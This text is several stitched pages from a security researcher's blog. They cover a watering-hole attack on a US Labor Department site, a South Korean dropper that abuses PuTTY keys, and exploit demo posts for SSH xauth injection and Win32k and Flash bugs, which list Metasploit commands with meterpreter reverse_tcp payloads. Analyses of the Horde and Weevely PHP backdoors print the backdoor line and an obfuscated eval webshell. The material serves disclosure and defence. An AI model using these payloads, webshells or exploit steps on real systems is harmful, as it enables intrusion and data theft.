[![infogath-js](https://eromang.zataz.com/wp-content/uploads/infogath-js.png)](https://eromang.zataz.com/wp-content/uploads/infogath-js.png)

An interesting information regarding “*/web/css.js*“, is that the “*Last Modified*” date reported by “*dol[.]ns01[.]us*” server is Thu, 14 Mar 2013 20:06:36 GMT. This is reporting that the information gathering infrastructure was in place since mid-March minimum.

[![dol.ns01.us-8081-1](https://eromang.zataz.com/wp-content/uploads/dol.ns01.us-8081-1-300x54.png)](https://eromang.zataz.com/wp-content/uploads/dol.ns01.us-8081-1.png)

Interesting facts regarding these information gathering scripts are:

* Scripts “*xss.php*“, “*js.php*” & “*css.js*” have move from IP 96[.]44[.]136[.]115 on port 80/TCP to domain dol[.]ns01[.]us port 8081/TCP. Move from port 80/TCP to 8081/TCP doesn’t seem to be logic, most of time outgoing connexion’s authorized on Firewalls, for corporate Web surfing, are 80/TCP and 443/TCP.
* Different types of information gathering scripts were in place, and all users who have visit DOL website were affected by this information gathering campaign.
* Usage of a specific information leakage vulnerability present in Internet Explorer 8 and not fixed by Microsoft.
* BitDefender 2012 deactivation attempt is confusing. Why trying to deactivate an anti-virus, this will surely generate an alert.

##### Information Gathered on dol[.]ns01[.]us

As described in the previous chapter, the information gathering code send a lot of information’s to the backend. Hopefully for security researchers, the backend wasn’t very well protected and all collected information’s were accessible without any restrictions in different web folders. You can find here under some statistics related to the gathered information’s.

[![TOP-10-TARGETED-COUNTRIES](https://eromang.zataz.com/wp-content/uploads/TOP-10-TARGETED-COUNTRIES.png)](https://eromang.zataz.com/wp-content/uploads/TOP-10-TARGETED-COUNTRIES.png)

Complete geolocation of the targeted source IPs

[![GEO-LOCALISATION](https://eromang.zataz.com/wp-content/uploads/GEO-LOCALISATION.png)](https://www.google.com/fusiontables/embedviz?viz=MAP&q=select+col5+from+1kEak6llYt6vtF1Fh6rQIKfLk4TSH6v4UrFSYjcI&h=false&lat=22.527830974761137&lng=15.237094299999967&z=2&t=1&l=col5&y=2&tmplt=2)

By analyzing the information’s sent to the backend, we can also see that DOL (www.sem.dol.gov) wasn’t the only compromised website:

* **From 2013-03-15 to 2013-04-29 : University Research Co. Cambodia** website (*www.urccambodia.org*) was the first target .This explain the high number of distinct IP addresses from Cambodia.
* **From 2013-04-08 to 2013-04-24 : Awards for Excellence in Education** website (*www.forexcellenceineducation.org*), a program of Fraser Institute, was the second target.
* **From 2013-04-08 to 2013-04-24 : ElectionGuide** website (*www.electionguide.org*), provided by the International Foundation for Electoral Systems (IFES), was the third target.
* **From 2013-04-09 to 2013-04-30 : French Institute of International Relations** website (*www.ifri.org*), was the fourth target.
* **From 2013-04-09 to 2013-04-24 : The Working for America Institute** website (*www.workingforamerica.org*), was the fifth target.
* **From 2013-04-09 to 2013-04-10 : The Project 2049 Institute** website (*www.project2049.net*), was the sixth target.
* **From 2013-04-10 to 2013-04-10 : The Union Label and Service Trades Department** website (*www.unionlabel.org*), was the seventh target.
* **From 2013-04-11 to 2013-04-30 : Thales Catalogue** website (*components-subsystems.thales-catalogue.com*), was the eighth target.
* **From 2013-04-23 to 2013-05-01 : United States Department of Labor (DOL) Site Exposure Matrices (SEM)** website (*www.sem.dol.gov*), was the ninth target.

Here under the hits by browsers and Internet Explorer 8 hits by OS.

[![Hits-by-Browsers](https://eromang.zataz.com/wp-content/uploads/Hits-by-Browsers.png)](https://eromang.zataz.com/wp-content/uploads/Hits-by-Browsers.png)

[![IE8-Hits-os2](https://eromang.zataz.com/wp-content/uploads/IE8-Hits-os2.png)](https://eromang.zataz.com/wp-content/uploads/IE8-Hits-os2.png)

##### Others Information’s Gathered

As you have read in the previous chapter, **ElectionGuide** website (*www.electionguide.org*) was also targeted during this watering hole campaign. As you can see in the following **urlQuery** submission, dating from [**2013-05-01**](http://urlquery.net/report.php?id=2257232), 96[.]44[.]136[.]115 is also present but don’t respond any more. Also if you observe the urlQuery submission of **[2013-05-03](http://urlquery.net/report.php?id=2310729),**96[.]44[.]136[.]115 is still present, but a new backend server has been setup in order replace the once deactivated.

[![electionguide-both](https://eromang.zataz.com/wp-content/uploads/electionguide-both.gif)](https://eromang.zataz.com/wp-content/uploads/electionguide-both.gif)

[![electionguide-info-gath-inclusions](https://eromang.zataz.com/wp-content/uploads/electionguide-info-gath-inclusions.png)](https://eromang.zataz.com/wp-content/uploads/electionguide-info-gath-inclusions.png)

If you observe the “Last Modified” date of “*css.js*” file, the installation date of these files is at least the 2013-05-03.

[![electionguide-css](https://eromang.zataz.com/wp-content/uploads/electionguide-css-300x54.png)](https://eromang.zataz.com/wp-content/uploads/electionguide-css.png)

Also, by researching some patterns matching the information’s gathering script on Google you can find some previous unknown campaigns, that were using the same code.

[![56go-google](https://eromang.zataz.com/wp-content/uploads/56go-google.png)](https://eromang.zataz.com/wp-content/uploads/56go-google.png)

[![56go-google-cache](https://eromang.zataz.com/wp-content/uploads/56go-google-cache-300x57.png)](https://eromang.zataz.com/wp-content/uploads/56go-google-cache.png)

# [Dark South Korea and Discovered PuTTY Tools Behaviours](https://eromang.zataz.com/2013/04/08/dark-south-korea-and-discovered-putty-tools-behaviours/)

[08/04/2013](https://eromang.zataz.com/2013/04/08/dark-south-korea-and-discovered-putty-tools-behaviours/ "Permalink to Dark South Korea and Discovered PuTTY Tools Behaviours")[Reverse Engineering](https://eromang.zataz.com/category/reverse-engineering/)[alg.exe](https://eromang.zataz.com/tag/alg-exe/), [conime.exe](https://eromang.zataz.com/tag/conime-exe/), [Korea](https://eromang.zataz.com/tag/korea/), [mRemote](https://eromang.zataz.com/tag/mremote/), [PuTTY](https://eromang.zataz.com/tag/putty/), [SecureCRT](https://eromang.zataz.com/tag/securecrt/)[wow](https://eromang.zataz.com/author/admin/ "View all posts by wow")

By analyzing one of the [**Dark South Korea**](https://eromang.zataz.com/2013/04/02/dark-south-korea-total-war-review/ "Dark South Korea Total War Review") dropper, I discovered interesting behaviours associated with the PuTTY binaries installed in “*%TMP%*” Windows folder. These behaviours could be considered as expected, but they could be used more efficiently in the future.

The two installed binaries are “*alg.exe*“ and “*conime.exe*“ used to upload “*~pr1.tmp*” bash file to \*NIX targets discovered in configuration files of mRemote and SecureCRT.

“*alg.exe*“ is “*plink.exe*“ a [**PuTTY**](http://www.chiark.greenend.org.uk/~sgtatham/putty/) tool acting as a command-line interface to the PuTTY back ends, and “*conime.exe*” is “*pscp.exe*” PuTTY tool acting as a SCP client, i.e. command-line secure file copy. These two binaries are legit and don’t contain any associated malwares, they are only used by a malware as support tools.

If **mRemote** is installed, the dropper extract all required information’s (credentials, ports, ip/domain) from “*confCons.xml*” configuration file, and use an encryption method vulnerability in mRemote to decrypt it the stored password. After exploitation of the vulnerability, “*conime.exe*” is used to drop the bash file on the targeted servers.

If the latest version of **SecureCRT** is installed, the dropper extract all required information’s (credentials, ports, ip/domain) present in “*\*.ini*” configuration files. Each saved connection in SecureCRT use it ones “*\*.ini*”. It seem that an *unknown vulnerability was present in previous versions of SecureCRT* in order to decrypt the stored password. But in the latest version of SecureCRT, this vulnerability don’t seem to be present. So when “*conime.exe*” try to connect to the targeted servers the authentication fails due to a bad password.

[![SecureCRT-2](https://eromang.zataz.com/wp-content/uploads/SecureCRT-2.png)](https://eromang.zataz.com/wp-content/uploads/SecureCRT-2.png)

During my research on the potential SecureCRT vulnerability, I was intrigued by “*conime.exe*” by access tentatives to the registry keys of PuTTY software “*HKCU\Software\SimonTatham\PuTTY\Sessions*” and “*HKCU\Software\SimonTatham\PuTTY\SshHostKeys*“.

[![PuTTY-1](https://eromang.zataz.com/wp-content/uploads/PuTTY-1.png)](https://eromang.zataz.com/wp-content/uploads/PuTTY-1.png)

I decided to install PuTTY, like a majority of sysadmin’s, and create an entry corresponding to potential server also recorded in SecureCRT software.

[![PuTTY-2](https://eromang.zataz.com/wp-content/uploads/PuTTY-2.png)](https://eromang.zataz.com/wp-content/uploads/PuTTY-2.png)

[![SecureCRT-1](https://eromang.zataz.com/wp-content/uploads/SecureCRT-1.png)](https://eromang.zataz.com/wp-content/uploads/SecureCRT-1.png)

Then I execute the dropper one more time and discovered that “*conime.exe*“, as expected, has access the PuTTY registry keys related to the targeted server “*HKCU\Software\SimonTatham\PuTTY\Sessions\192.168.178.54*“. The dropper authentication tentative was still unsuccessful, du to the wrong password.

[![PuTTY-3](https://eromang.zataz.com/wp-content/uploads/PuTTY-3.png)](https://eromang.zataz.com/wp-content/uploads/PuTTY-3.png)

But I also observed that “*conime.exe*” was also trying to access another registry key of PuTTY “*HKCU\Software\SimonTatham\PuTTY\SshHostKeys\rsa2@22:192.168.178.54*“.

[![PuTTY-4](https://eromang.zataz.com/wp-content/uploads/PuTTY-4.png)](https://eromang.zataz.com/wp-content/uploads/PuTTY-4.png)

I decided then to create a private and public SSH key, and to configure my putty session to support this SSH private key authentication. The private key wasn’t protected by a passphrase.

[![PuTTY-5](https://eromang.zataz.com/wp-content/uploads/PuTTY-5.png)](https://eromang.zataz.com/wp-content/uploads/PuTTY-5.png)

I execute the dropper one more time and observed a successfull authentication on the targeted server. “*conime.exe*” was using the private key path present in PuTTY registry key.

[![PuTTY-6](https://eromang.zataz.com/wp-content/uploads/PuTTY-6.png)](https://eromang.zataz.com/wp-content/uploads/PuTTY-6.png)

My final test was to remove the private key from the PuTTY configuration and use “*pageant.exe*“, an SSH authentication agent for PuTTY, PSCP, PSFTP, and Plink. I loaded my private key in “*pageant.exe*” and executed the dropper one more time. Same result as the previous one, a successfull authentication on the targeted server.

**Conclusions**

1. By analyzing one of the Dark South Korea dropper, with associated vulnerabilities in mRemote and SecureCRT, we can observ that the “bad guys” have use old vulnerabilities in old softwares in order to infect \*NIX servers. Why use these old vulnerabilities, if you can simply target PuTTY when it is used with private keys.
2. Never generate a private key without a passphrase
3. Don’t let PuTTY Pageant run with charged private keys.

# Posts navigation

[← Older posts](https://eromang.zataz.com/category/reverse-engineering/page/2/)

[Proudly powered by WordPress](https://wordpress.org/)



=== Content from eromang.zataz.com_201f6888_20250126_054633.html ===


[# Eric Romang Blog

## aka wow on ZATAZ.com](https://eromang.zataz.com/ "Eric Romang Blog")
Menu
[Skip to content](#content "Skip to content")

Search for:

# [CVE-2016-3116 Dropbear SSH forced-command and security bypass](https://eromang.zataz.com/2016/03/17/cve-2016-3116-dropbear-ssh-forced-command-and-security-bypass/)

[17/03/2016](https://eromang.zataz.com/2016/03/17/cve-2016-3116-dropbear-ssh-forced-command-and-security-bypass/ "Permalink to CVE-2016-3116 Dropbear SSH forced-command and security bypass")[Exploits](https://eromang.zataz.com/category/exploits/)[CVE-2016-3116](https://eromang.zataz.com/tag/cve-2016-3116/), [Dropbear](https://eromang.zataz.com/tag/dropbear/)[wow](https://eromang.zataz.com/author/admin/ "View all posts by wow")

#### Timeline :

Vulnerability discovered and reported to the vendor by tintinweb

[Patch provided by the vendor](https://matt.ucc.asn.au/dropbear/CHANGES) the 2016-03-09

[PoC and details provided by tintinweb](https://github.com/tintinweb/pub/tree/master/pocs/cve-2016-3116) the 2016-03-10

#### **PoC provided by :**

tintinweb

#### **Reference(s) :**

[CVE-2016-3116](http://seclists.org/fulldisclosure/2016/Mar/47)

#### **Affected version(s) :**

All versions of dropbear SSH prior to 2016.72 with X11Forwarding enabled.

#### **Tested on**:

Ubuntu 15.10 with Dropbear server v2015.71

#### **Description :**

Missing sanitisation of untrusted input allows an authenticated user who is able to request X11 forwarding to inject commands to xauth.

Injection of xauth commands grants the ability to read arbitrary files under the authenticated user’s privilege, Other xauth commands allow limited information leakage, file overwrite, port probing and generally expose xauth, which was not written with a hostile user in mind, as an attack surface.

xauth is run under the user’s privilege, so this vulnerability offers no additional access to unrestricted accounts, but could circumvent key or account restrictions such as sshd\_config ForceCommand, authorized\_keys command=”…” or restricted shells.

#### **Commands :**

```
Create a shell (/bin/bash) user1:
- with ssh key or password authentication
- add a force commands in authorized_keys file, like command="whoami"

Normally only the command “whoami” will be executed when SSH authentication will be done

Create a non-shell (/bin/false) user2

Start dropbear
dropbear -R -F -E -p 2222

User provided PoC python script and connect to the vulnerable host
python poc.py <host> <port> <username> <password or path_to_privkey>
For example: python poc.py 192.168.6.146 22 user1 test

“.readfile” command allow to read files on the system
“.writefile” command allow to write files on the system
```

# [CVE-2016-3115 OpenSSH forced-command and security bypass](https://eromang.zataz.com/2016/03/17/cve-2016-3115-openssh-forced-command-and-security-bypass/)

[17/03/2016](https://eromang.zataz.com/2016/03/17/cve-2016-3115-openssh-forced-command-and-security-bypass/ "Permalink to CVE-2016-3115 OpenSSH forced-command and security bypass")[Exploits](https://eromang.zataz.com/category/exploits/)[CVE-2016-3115](https://eromang.zataz.com/tag/cve-2016-3115/), [OpenSSH](https://eromang.zataz.com/tag/openssh/)[wow](https://eromang.zataz.com/author/admin/ "View all posts by wow")

#### Timeline :

Vulnerability discovered and reported to the vendor by tintinweb

[Patch provided by the vendor](http://www.openssh.com/txt/x11fwd.adv) the 2016-03-09

[PoC and details](https://github.com/tintinweb/pub/tree/master/pocs/cve-2016-3115/) provided by tintinweb the 2016-03-10

#### **PoC provided by :**

tintinweb

#### **Reference(s) :**

[CVE-2016-3115](http://seclists.org/fulldisclosure/2016/Mar/46)

#### **Affected version(s) :**

All versions of OpenSSH prior to 7.2p2 with X11Forwarding enabled.

#### **Tested on**:

Ubuntu 15.10 with OpenSSH\_6.9p1 Ubuntu-2, OpenSSL 1.0.2d 9 Jul 2015

#### **Description :**

Missing sanitisation of untrusted input allows an authenticated user who is able to request X11 forwarding to inject commands to xauth.

Injection of xauth commands grants the ability to read arbitrary files under the authenticated user’s privilege, Other xauth commands allow limited information leakage, file overwrite, port probing and generally expose xauth, which was not written with a hostile user in mind, as an attack surface.

xauth is run under the user’s privilege, so this vulnerability offers no additional access to unrestricted accounts, but could circumvent key or account restrictions such as sshd\_config ForceCommand, authorized\_keys command=”…” or restricted shells.

#### **Commands :**

```
Create a shell (/bin/bash) user1:
- with ssh key or password authentication
- add a force commands in authorized_keys file, like command="whoami"

Normally only the command “whoami” will be executed when SSH authentication will be done

Create a non-shell (/bin/false) user2

User provided PoC python script and connect to the vulnerable host
python poc.py <host> <port> <username> <password or path_to_privkey>
For example: python poc.py 192.168.6.146 22 user1 test

“.readfile” command allow to read files on the system
“.writefile” command allow to write files on the system
```

# [CVE-2015-1701 Windows ClientCopyImage Win32k Exploit](https://eromang.zataz.com/2016/02/29/cve-2015-1701-windows-clientcopyimage-win32k-exploit/)

[29/02/2016](https://eromang.zataz.com/2016/02/29/cve-2015-1701-windows-clientcopyimage-win32k-exploit/ "Permalink to CVE-2015-1701 Windows ClientCopyImage Win32k Exploit")[Exploits](https://eromang.zataz.com/category/exploits/), [Metasploit](https://eromang.zataz.com/category/metasploit-pen-test/)[CVE-2015-1701](https://eromang.zataz.com/tag/cve-2015-1701/), [Microsoft](https://eromang.zataz.com/tag/microsoft/), [MS15-051](https://eromang.zataz.com/tag/ms15-051/), [Windows](https://eromang.zataz.com/tag/windows/), [Windows 0day](https://eromang.zataz.com/tag/windows-0day/)[wow](https://eromang.zataz.com/author/admin/ "View all posts by wow")

#### Timeline :

Vulnerability [discovered exploited in the wild](https://www.fireeye.com/blog/threat-research/2015/04/probable_apt28_useo.html) by FireEye the 2015-04-13

Patch provided by the vendor via MS15-051 the 2015-05-12

[PoC provided by hfiref0x](https://github.com/hfiref0x/CVE-2015-1701) the 2015-05-12

Metasploit PoC provided the 2015-06-03

#### **PoC provided by :**

Unknown

hfirefox

OJ Reeves

Spencer McIntyre

#### **Reference(s) :**

[CVE-2015-1701](http://cvedetails.com/cve/2015-1701/)

[MS15-051](http://technet.microsoft.com/en-us/security/bulletin/MS15-051)

#### **Affected version(s) :**

Windows Server 2003 Service Pack 2

Windows Vista Service Pack 2

Windows Server 2008 Service Pack 2

Windows 7 Service Pack 1

#### **Tested on**:

Windows 7 SP1 (64-bit), IE8 and Adobe Flash 17.0.0.188 ([CVE-2015-3105](https://eromang.zataz.com/2016/02/29/cve-2015-3105-adobe-flash-player-drawing-fill-shader-memory-corruption/)) for remote exploitation

#### **Description :**

This module exploits improper object handling in the win32k.sys kernel mode driver. This module has been tested on vulnerable builds of Windows 7 x64 and x86, and Windows 2008 R2 SP1 x64.

#### **Commands :**

```
Remote exploitation
use exploit/multi/browser/adobe_flash_shader_drawing_fill
set SRVHOST 192.168.6.138
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 192.168.6.138
run

getuid

Local privileges escalation
use exploit/windows/local/ms15_051_client_copy_image
set PAYLOAD windows/meterpreter/reverse_tcp
set LPORT 4445
set SESSION 1
run

getuid
```

# [CVE-2015-3105 Adobe Flash Player Drawing Fill Shader Memory Corruption](https://eromang.zataz.com/2016/02/29/cve-2015-3105-adobe-flash-player-drawing-fill-shader-memory-corruption/)

[29/02/2016](https://eromang.zataz.com/2016/02/29/cve-2015-3105-adobe-flash-player-drawing-fill-shader-memory-corruption/ "Permalink to CVE-2015-3105 Adobe Flash Player Drawing Fill Shader Memory Corruption")[Exploits](https://eromang.zataz.com/category/exploits/), [Metasploit](https://eromang.zataz.com/category/metasploit-pen-test/)[Adobe](https://eromang.zataz.com/tag/adobe/), [Adobe Flash](https://eromang.zataz.com/tag/adobe-flash/), [APSB15-11](https://eromang.zataz.com/tag/apsb15-11/), [CVE-2015-3105](https://eromang.zataz.com/tag/cve-2015-3105/), [Flash](https://eromang.zataz.com/tag/flash/)[wow](https://eromang.zataz.com/author/admin/ "View all posts by wow")

#### Timeline :

Vulnerability discovered and reported to the vendor by Chris Evans of Google Project Zero

Patch provided by the vendor via APSB15-11 the 2015-06-09

Vulnerability [discovered exploited in the Exploit Kits](http://blog.trendmicro.com/trendlabs-security-intelligence/magnitude-exploit-kit-uses-newly-patched-adobe-vulnerability-us-canada-and-uk-are-most-at-risk/) the 2015-06-16

Metasploit PoC provided the 2015-06-25

#### **PoC provided by :**

Chris Evans

Unknown

juan vazquez

#### **Reference(s) :**

[CVE-2015-3105](http://cvedetails.com/cve/2015-3105/)

[APSB15-11](https://helpx.adobe.com/security/products/flash-player/apsb15-11.html)

#### **Affected version(s) :**

Adobe Flash Player 16.0.0.305 and earlier versions

Adobe Flash Player 11.2.202.442 and earlier 11.x versions

#### **Tested on**:

Windows 7 SP1 (64-bit), IE8 and Adobe Flash 17.0.0.188

#### **Description :**

This module exploits a memory corruption happening when applying a Shader as a drawing fill as exploited in the wild on June 2015. This module has been tested successfully on:

\* Windows 7 SP1 (32-bit), IE11 and Adobe Flash 17.0.0.188

\* Windows 7 SP1 (32-bit), Firefox 38.0.5 and Adobe Flash 17.0.0.188

\* Windows 8.1, Firefox 38.0.5 and Adobe Flash 17.0.0.188

\* Linux Mint “Rebecca” (32 bits), Firefox 33.0 and Adobe Flash 11.2.202.460.

#### **Commands :**

```
use exploit/multi/browser/adobe_flash_shader_drawing_fill
set SRVHOST 192.168.6.138
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 192.168.6.138
run

getuid
sysinfo
```

# Posts navigation

[← Older posts](https://eromang.zataz.com/page/2/)

[Proudly powered by WordPress](https://wordpress.org/)



=== Content from eromang.zataz.com_98c1461d_20250126_054644.html ===


[# Eric Romang Blog

## aka wow on ZATAZ.com](https://eromang.zataz.com/ "Eric Romang Blog")
Menu
[Skip to content](#content "Skip to content")

Search for:

# Tag Archives: Backdoor

# [CVE-2012-0209 Horde 3.3.12 Backdoor Metasploit Demo](https://eromang.zataz.com/2012/02/17/cve-2012-0209-horde-3-3-12-backdoor-metasploit-demo/)

[17/02/2012](https://eromang.zataz.com/2012/02/17/cve-2012-0209-horde-3-3-12-backdoor-metasploit-demo/ "Permalink to CVE-2012-0209 Horde 3.3.12 Backdoor Metasploit Demo")[Exploits](https://eromang.zataz.com/category/exploits/), [Metasploit](https://eromang.zataz.com/category/metasploit-pen-test/)[Backdoor](https://eromang.zataz.com/tag/backdoor/), [Horde](https://eromang.zataz.com/tag/horde/)[wow](https://eromang.zataz.com/author/admin/ "View all posts by wow")

#### Timeline :

Public release of the vulnerability the 2012-02-13

Details of the vulnerability and first PoC disclosed by Eric Romang the 2012-02-15

Metasploit PoC provided the jduck 2012-02-16

#### **PoC provided by :**

[Eric Romang](https://eromang.zataz.com/2012/02/15/cve-2012-0209-horde-backdoor-analysis/ "CVE-2012-0209 Horde backdoor analysis")

jduck

#### **Reference(s) :**

[CVE-2012-0209](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-0209)

#### **Affected version(s) :**

Horde 3.3.12 downloaded between November 15 and February 7

Horde Groupware 1.2.10 downloaded between November 9 and February 7

Horde Groupware Webmail Edition 1.2.10 downloaded between November 2 and February 7

#### **Tested on Ubuntu 11.10** with :

Horde 3.3.12

#### **Description :**

This module exploits an arbitrary PHP code execution vulnerability introduced as a backdoor into Horde 3.3.12 and Horde Groupware 1.2.10.

#### **Commands :**

```
use exploit/multi/http/horde_href_backdoor
set VHOST devnull.zataz.loc
set RHOST 192.168.178.100
set PAYLOAD cmd/unix/generic
set CMD uname -a
exploit
```

# [CVE-2012-0209 Horde backdoor analysis](https://eromang.zataz.com/2012/02/15/cve-2012-0209-horde-backdoor-analysis/)

[15/02/2012](https://eromang.zataz.com/2012/02/15/cve-2012-0209-horde-backdoor-analysis/ "Permalink to CVE-2012-0209 Horde backdoor analysis")[Reverse Engineering](https://eromang.zataz.com/category/reverse-engineering/)[Backdoor](https://eromang.zataz.com/tag/backdoor/), [Horde](https://eromang.zataz.com/tag/horde/)[wow](https://eromang.zataz.com/author/admin/ "View all posts by wow")

[![](https://eromang.zataz.com/wp-content/uploads/horde-color.gif "horde-color")](https://eromang.zataz.com/wp-content/uploads/horde-color.gif)The 13/02 **[Horde](http://www.horde.org/)** team has release a **[security alert](http://dev.horde.org/h/jonah/stories/view.php?channel_id=1&id=155)** concerning their products. An unknown intruder has hack the FTP server of Horde since minimum November 02 2011 and has manipulate three Horde releases to allow unauthenticated remote PHP execution. The intruder has maintain access to the servers until February 7. The issue is currently tracked through **[CVE-2012-0209](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-0209)**.

The affected releases are:

* Horde 3.3.12 downloaded between November 15 and February 7
* Horde Groupware 1.2.10 downloaded between November 9 and February 7
* Horde Groupware Webmail Edition 1.2.10 downloaded between November 2 and February 7

**Horde 4 is not affected**, the CVS and Git repositories seem to not be affected, but some Linux distributions how have download the code source from the Horde FTP server are affected. Horde team is providing version 3.3.13 for Horde, 1.2.11 for Horde Groupware and Horde Groupware Webmail Edition to remove the discovered backdoor and has also clean the FTP server.

After some researches, I found two vulnerable Linux distribution how are delivering the backdoored Horde 3.3.12. These distributions are **[Ubuntu precise](http://packages.ubuntu.com/precise/horde3)**, **[Debian wheezy](http://packages.debian.org/wheezy/horde3)** and **[sid](http://packages.debian.org/sid/horde3)**. **Fedora Rawhide** doesn’t seem to be impacted unless the distributed version is also [3.3.12](https://bugzilla.redhat.com/show_bug.cgi?id=789555), same for **OpenSUSE** 12.1. **Gentoo**, **Mandriva** and **Slackware** doesn’t seem to deliver this version. The impact through Linux distribution should be not so important. Only users how have download the source code from FTP are mainly affected.

The backdoor is located, for Horde 3.3.12, in the “*templates/javascript/open\_calendar.js*” script.

`link.href = '# php (isset($_COOKIE["href"]) && preg_match("/(.*):(.*)/", $_COOKIE["href"], $m))?$m[1]($m[2]):"";?>';`

Take a look on the following **[Pastebin](http://pastebin.com/bcXZYcMb)** for the diff between a clean and a backdoored 3.3.12 version.

As you can see, if the cookie contain an array named “*href*” and if the content of the href variable look like to, for example, “*shell\_exec:’uname -a’*“, the PHP function will be executed. Now that we have found the backdoor, how is this backdoor activated ?

All my previous analysis were false, after trying to exploit without success the backdoor, I have finally discover the vulnerable script.

The vulnerable script is “*/services/javascript.php*“. If you take a look a the script you can see that you need to do a POST request with two variables on the top of the necessary cookie.

 `$app = Util::getFormData('app', Util::nonInputVar('app'));

$file = Util::getFormData('file', Util::nonInputVar('file'));

if (!empty($app) && !empty($file) && strpos($file, '..') === false) {

$script_file = $registry->get('templates', $app) . '/javascript/' . $file;

if (file_exists($script_file)) {

 $registry->pushApp($app, false);

 $script = Util::bufferOutput('require', $script_file);

if ($send_headers) {

Horde::compressOutput();

header('Cache-Control: no-cache');

header('Content-Type: text/javascript');

}

echo $script;

}

}`

“*app*” variable is one of the application how is active on the Horde installation, the applications are configured in the “*/config/registry.php*” file.

 `$this->applications['horde'] = array(

'fileroot' => dirname(__FILE__) . '/..',

'webroot' => _detect_webroot(),

'initial_page' => 'login.php',

'name' => _("Horde"),

'status' => 'active',

'templates' => dirname(__FILE__) . '/../templates',

'provides' => 'horde',

);`

“*file*” variable should be the backdoored JavaScript file aka “*open\_calendar.js*“. After that you have provide the two variables and the “*href*” cookie, the backdoor is executed. I have develop a PoC in order to exploit the backdoor. You can find this PoC on my **[Pastebin](http://pastebin.com/U3ADiWrP)**.

# [Weevely Stealth Tiny PHP Backdoor Analysis](https://eromang.zataz.com/2011/10/11/weevely-stealth-tiny-php-backdoor-analysis/)

[11/10/2011](https://eromang.zataz.com/2011/10/11/weevely-stealth-tiny-php-backdoor-analysis/ "Permalink to Weevely Stealth Tiny PHP Backdoor Analysis")[Various](https://eromang.zataz.com/category/various/)[Backdoor](https://eromang.zataz.com/tag/backdoor/)[wow](https://eromang.zataz.com/author/admin/ "View all posts by wow")

[@adulau](https://twitter.com/#!/adulau) has sent a tweet about a stealth tiny PHP backdoor named **[Weevely](https://code.google.com/p/weevely/)** how is **pretending** to be unobtrusive and not detectable by NIDS, anti-viruses and [log review activity](https://eromang.zataz.com/category/log-management/). Weevely simulate a telnet-like session, if you communicate with the backdoor through HTTP, or ssh-like session, if you communicate with the backdoor through HTTPS.

Weevely is a python program how will permit you to generate a “*server*” PHP code in order to trojanize a Web server and take control of it. After a successful application Web attack exploitation, through for examples, RFI, LFI or MySQL LOAD INFILE, you only need to upload the “*server*” PHP code on the target, and your local Weevely python script will use the “*server*” PHP code in order to transmit orders.

All commands are sent through hidden datas in HTTP referrers and these commands are using dynamic probe of system-like functions to bypass PHP security restrictions. Weevely try to bypass PHP configurations that disable sensible functions who execute external programs, enabled with the *disable functions* option located in *php.ini*.

#### Weevely Server Code Analysis & Fingerprinting

The “*server*” PHP code look like this:

```
<?php eval(base64_decode('aW5pX3NldCgnZXJyb3JfbG9nJywgJy9kZXYvbnVsbCcpO3BhcnNlX3N0cigkX1NFUlZFUlsnSFRUUF9SRUZFUkVSJ10sJGEpO2lmKHJlc2V0KCRhKT09J215JyAmJiBjb3VudCgkYSk9PTkpIHtlY2hvICc8cGFzc3dvcmQ+JztldmFsKGJhc2U2NF9kZWNvZGUoc3RyX3JlcGxhY2UoIiAiLCAiKyIsIGpvaW4oYXJyYXlfc2xpY2UoJGEsY291bnQoJGEpLTMpKSkpKTtlY2hvICc8L3Bhc3N3b3JkPic7fQ==')); ?>
```

As you see the code is obfuscated in base64 and the result of the deobfuscation is:

```
ini_set('error_log', '/dev/null');parse_str($_SERVER['HTTP_REFERER'],$a);if(reset($a)=='my' && count($a)==9) {echo '<password>';eval(base64_decode(str_replace(" ", "+", join(array_slice($a,count($a)-3)))));echo '</password>';}
```

The script is forcing PHP to send the script error to “*/dev/null*“, parse the HTTP referrer and decode the commands with the provided password.

If you test the “*server*” code on Virustotal, only 1 on 43 anti-viruses is detecting the code as a malware. But the code obfuscation method is basic and the code is only encoded 1 time. Surely in a near future most of the anti-viruses will detect it.

[![](https://eromang.zataz.com/wp-content/uploads/Weevely-virustotal.png "Weevely-virustotal")](https://eromang.zataz.com/wp-content/uploads/Weevely-virustotal.png)

Actually most of common PHP backdoors, like c99, STUNSHELL, etc., embed the complete malware code and obfuscate the code with basic methods. The HTTP referrer Weevely approach is quiet interesting and new, the code is no more embedded but dynamic.

But some common PHP backdoors are now obfuscated with more complex methods, like “*gzinflate(str\_rot13(base64\_decode(‘malware’)))*” and encoded more than 10 times. These codes are only detected by few anti-viruses, [like this one on Virustotal](http://www.virustotal.com/file-scan/report.html?id=c370dc893e50b09371049b365a6b256af23b30e4f07c68be70d310ebb1f8ef1a-1318061208).

On the Web server side, when a Weevely command is sent to the “*server*” PHP code you will see this typical kind of logs in your *access.log* file.

```
192.168.178.25 - - [11/Oct/2011:00:44:25 +0200] "GET /mybb/readme.php HTTP/1.0" 200 237 "http://www.google.com/url?sa=my&source=web&ct=7&url=http%3A//blackbox.zataz.loc/mybb/readme.php&rct=j&q=mybb readme&ei=ZWNob&usg=yA1Nz&sig2=ExNjs=" "Python-urllib/1.17, Mozilla/5.0 (Windows; U; Windows NT 5.1; en-GB; rv:1.8.1.6) Gecko/20070725 Firefox/2.0.0.6"
```

You can see that the HTTP referrer is google.com and that the command is encoded. If you compare Weevely HTTP referrer to a normal google.com HTTP referrer, here under, you can see that they are really few differences. It is clearly impossible to distinguish a valid HTTP referrer with a forged one.

```
xxx.xxx.xxx.xxx - - [11/Sep/2011:20:45:52 +0200] "GET /2011/02/06/cve-2010-3867-proftpd-iac-remote-root-exploit/ HTTP/1.1" 200 11751 "http://www.google.com/url?sa=t&source=web&cd=12&ved=0CB8QFjABOAo&url=http%3A%2F%2Feromang.zataz.com%2F2011%2F02%2F06%2Fcve-2010-3867-proftpd-iac-remote-root-exploit%2F&rct=j&q=proftpd%20IAC%20Buffer%20Overflow&ei=2wFtTt6jHMjd4QS8iunYBA&usg=AFQjCNHZ_21-rBnWO0Hu3YgMYub6dE7oqA&sig2=fHqAoyj7khMooGBCTuuqyw" "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/533.21.1 (KHTML, like Gecko) Version/5.0.5 Safari/533.21.1"
```

